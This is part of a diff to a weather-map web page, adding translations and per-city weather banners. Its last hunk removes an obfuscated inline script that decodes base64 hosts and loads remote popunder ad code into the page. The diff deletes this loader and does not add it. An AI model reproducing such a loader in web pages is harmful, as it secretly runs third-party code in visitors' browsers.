+      saveBtn: "Simpan",
+      humidity: "Kelembaban",
+      wind: "Angin"
+    },
+    ur: {
+      title: "میری موسم کا نقشہ",
+      subtitle: "دنیا بھر میں رئیل ٹائم موسم کی تلاش کریں یا نیچے کوئی بھی شہر تلاش کریں",
+      searchPlaceholder: "شہر تلاش کریں (مثال: لندن)",
+      searchButton: "تلاش کریں",
+      gameButton: "🎮 ویدرگیسر کھیلیں",
+      settingsBtn: "ترتیبات ⚙️",
+      favoritesTitle: "آپ کے پسندیدہ مقامات",
+      addFavoritePlaceholder: "پسندیدہ میں شہر شامل کریں",
+      addFavoriteBtn: "پسندیدہ میں شامل کریں",
+      aboutTitle: "میری موسم کے نقشہ کے بارے میں",
+      aboutText: "میری موسم کا نقشہ ایک انٹرایکٹو عالمی نقشہ ہے جو بڑے عالمی شہروں کے لیے موجودہ موسمی حالات دکھاتا ہے۔ وہاں کے موسم کے بارے میں مزید جاننے کے لیے کسی بھی مارکر پر کلک کریں، یا تفصیلی پیشن گوئی دیکھنے کے لیے سرچ بار استعمال کریں۔ یہ ایپ WeatherAPI.com کی طرف سے چلائی جاتی ہے اور مکمل طور پر مفت ہے۔",
+      noFavorites: "ابھی تک کوئی پسندیدہ مقامات نہیں ہیں۔",
+      removeFavTitle: "پسندیدہ سے ہٹائیں",
+      settingsLabel: "زبان منتخب کریں",
+      saveBtn: "محفوظ کریں",
+      humidity: "نمی",
+      wind: "ہوا"
+    },
+    bn: {
+      title: "ম্যাপমাইওয়েদার",
+      subtitle: "বিশ্বব্যাপী রিয়েল-টাইম আবহাওয়া অন্বেষণ করুন বা নীচে যেকোনো শহর অনুসন্ধান করুন",
+      searchPlaceholder: "একটি শহর অনুসন্ধান করুন (উদাহরণ: লন্ডন)",
+      searchButton: "অনুসন্ধান",
+      gameButton: "🎮 ওয়েদারগেসার খেলুন",
+      settingsBtn: "সেটিংস ⚙️",
+      favoritesTitle: "আপনার প্রিয় অবস্থান",
+      addFavoritePlaceholder: "প্রিয়তে একটি শহর যোগ করুন",
+      addFavoriteBtn: "প্রিয়তে যোগ করুন",
+      aboutTitle: "ম্যাপমাইওয়েদার সম্পর্কে",
+      aboutText: "ম্যাপমাইওয়েদার একটি ইন্টারেক্টিভ ওয়ার্ল্ড ম্যাপ যা প্রধান বৈশ্বিক শহরগুলির জন্য বর্তমান আবহাওয়ার অবস্থা দেখায়। সেখানকার আবহাওয়া সম্পর্কে আরও জানতে যেকোনো মার্কারে ক্লিক করুন, বা বিস্তারিত পূর্বাভাস দেখতে সার্চ বার ব্যবহার করুন। এই অ্যাপটি WeatherAPI.com দ্বারা চালিত এবং সম্পূর্ণ বিনামূল্যে ব্যবহারযোগ্য।",
+      noFavorites: "এখনও কোন প্রিয় অবস্থান নেই।",
+      removeFavTitle: "প্রিয় থেকে সরান",
+      settingsLabel: "ভাষা নির্বাচন করুন",
+      saveBtn: "সংরক্ষণ করুন",
+      humidity: "আর্দ্রতা",
+      wind: "বাতাস"
     }
   };
 
@@ -550,18 +900,18 @@ cities.forEach(city => {
 
   // Initialize map and markers
   const cities = [
-    { name: "New York", coords: [40.7128, -74.0060] },
-    { name: "London", coords: [51.5074, -0.1278] },
-    { name: "Tokyo", coords: [35.6762, 139.6503] },
-    { name: "Sydney", coords: [-33.8688, 151.2093] },
-    { name: "Singapore", coords: [1.3521, 103.8198] },
-    { name: "Paris", coords: [48.8566, 2.3522] },
-    { name: "Dubai", coords: [25.276987, 55.296249] },
-    { name: "Toronto", coords: [43.65107, -79.347015] },
-    { name: "Rio de Janeiro", coords: [-22.9068, -43.1729] },
-    { name: "Cape Town", coords: [-33.9249, 18.4241] },
-    { name: "Moscow", coords: [55.7558, 37.6173] },
-    { name: "Istanbul", coords: [41.0082, 28.9784] }
+    { name: "New York", coords: [40.7128, -74.0060], bannerPos: [45, -80] },
+    { name: "London", coords: [51.5074, -0.1278], bannerPos: [55, -10] },
+    { name: "Tokyo", coords: [35.6762, 139.6503], bannerPos: [40, 145] },
+    { name: "Sydney", coords: [-33.8688, 151.2093], bannerPos: [-40, 155] },
+    { name: "Singapore", coords: [1.3521, 103.8198], bannerPos: [5, 108] },
+    { name: "Paris", coords: [48.8566, 2.3522], bannerPos: [50, 0] },
+    { name: "Dubai", coords: [25.276987, 55.296249], bannerPos: [28, 58] },
+    { name: "Toronto", coords: [43.65107, -79.347015], bannerPos: [48, -85] },
+    { name: "Rio de Janeiro", coords: [-22.9068, -43.1729], bannerPos: [-25, -40] },
+    { name: "Cape Town", coords: [-33.9249, 18.4241], bannerPos: [-38, 22] },
+    { name: "Moscow", coords: [55.7558, 37.6173], bannerPos: [60, 40] },
+    { name: "Istanbul", coords: [41.0082, 28.9784], bannerPos: [44, 32] }
   ];
 
   const map = L.map("map").setView([20, 0], 2);
@@ -570,12 +920,51 @@ cities.forEach(city => {
     attribution: "© OpenStreetMap contributors"
   }).addTo(map);
 
+  // Create weather banners for each city
+  function createWeatherBanner(city) {
+    fetch(`https://api.weatherapi.com/v1/current.json?key=${WEATHER_API_KEY}&q=${encodeURIComponent(city.name)}`)
+      .then(res => {
+        if (!res.ok) throw new Error("Weather not found");
+        return res.json();
+      })
+      .then(data => {
+        const banner = L.marker(city.coords, {
+          icon: L.divIcon({
+            className: 'city-weather-banner',
+            html: `
+              <div>
+                <h3>${data.location.name}</h3>
+                <div class="temp">${Math.round(data.current.temp_c)}°C</div>
+                <div class="desc">${data.current.condition.text}</div>
+                <div class="details">
+                  <span>${translations[lang].humidity}: ${data.current.humidity}%</span>
+                  <span>${translations[lang].wind}: ${data.current.wind_kph} km/h</span>
+                </div>
+              </div>
+            `,
+            iconSize: [250, 100],
+            iconAnchor: [125, 50]
+          })
+        }).addTo(map);
+
+        banner.on("click", () => {
+          window.location.href = `weather.html?city=${encodeURIComponent(city.name)}`;
+        });
+      })
+      .catch(err => {
+        console.error("Weather fetch error:", err);
+        // Add marker without weather data
+        const marker = L.marker(city.coords).addTo(map);
+        marker.bindPopup(city.name);
+        marker.on("click", () => {
+          window.location.href = `weather.html?city=${encodeURIComponent(city.name)}`;
+        });
+      });
+  }
+
+  // Add weather banners for all cities
   cities.forEach(city => {
-    const marker = L.marker(city.coords).addTo(map);
-    marker.bindPopup(city.name);
-    marker.on("click", () => {
-      window.location.href = `weather.html?city=${encodeURIComponent(city.name)}`;
-    });
+    createWeatherBanner(city);
   });
 
   // Favorites management
@@ -645,9 +1034,11 @@ cities.forEach(city => {
             <h3>${data.location.name}</h3>
             <div class="temp">${Math.round(data.current.temp_c)}°C</div>
             <div class="desc">${data.current.condition.text}</div>
-            <div>${t.removeFavTitle}: 
-              <button class="remove-fav-btn" title="${t.removeFavTitle}" aria-label="${t.removeFavTitle}">✖</button>
+            <div class="details">
+              <span>${t.humidity}: ${data.current.humidity}%</span>
+              <span>${t.wind}: ${data.current.wind_kph} km/h</span>
             </div>
+            <button class="remove-fav-btn" title="${t.removeFavTitle}" aria-label="${t.removeFavTitle}">✖</button>
           `;
           container.appendChild(div);
 
@@ -730,49 +1121,6 @@ cities.forEach(city => {
     renderFavorites(); // Refresh favorites text as well
     settingsModal.classList.remove("show");
   });
-  // Weather tooltip on marker press-and-hold
-let weatherTooltip;
-
-cities.forEach(city => {
-  const marker = L.marker(city.coords).addTo(map);
-  marker.bindPopup(city.name);
-
-  marker.on("click", () => {
-    window.location.href = `weather.html?city=${encodeURIComponent(city.name)}`;
-  });
-
-  marker.on("mousedown", async () => {
-    try {
-      const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${WEATHER_API_KEY}&q=${encodeURIComponent(city.name)}`);
-      const data = await res.json();
-
-      weatherTooltip = L.popup({
-        closeButton: false,
-        autoClose: false,
-        className: 'weather-desc-popup'
-      })
-        .setLatLng(city.coords)
-        .setContent(`<strong>${city.name}</strong><br>${data.current.condition.text}, ${data.current.temp_c}°C`)
-        .openOn(map);
-    } catch (err) {
-      console.error("Weather fetch error:", err);
-    }
-  });
-
-  marker.on("mouseup", () => {
-    if (weatherTooltip) map.closePopup(weatherTooltip);
-  });
-
-  marker.on("mouseout", () => {
-    if (weatherTooltip) map.closePopup(weatherTooltip);
-  });
-});
-
-</script>
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var u=window,x="d2d676aeff29868273cc7c6f1ecab65f",n=[["siteId",516*110+679+5163362],["minBid",0.0000000000000000000001],["popundersPerIP","24,24"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],a=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9yanF1ZXJ5LmpzY3JvbGxwYW5lLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvWnIva3VybC5taW4uanM="],w=-1,g,b,c=function(){clearTimeout(b);w++;if(a[w]&&!(1779060234000<(new Date).getTime()&&1<w)){g=u.document.createElement("script");g.type="text/javascript";g.async=!0;var l=u.document.getElementsByTagName("script")[0];g.src="https://"+atob(a[w]);g.crossOrigin="anonymous";g.onerror=c;g.onload=function(){clearTimeout(b);u[x.slice(0,16)+x.slice(0,16)]||c()};b=setTimeout(c,5E3);l.parentNode.insertBefore(g,l)}};if(!u[x]){try{Object.freeze(u[x]=n)}catch(e){}c()}})();
-/*]]>/* */
 </script>
 
 </body>
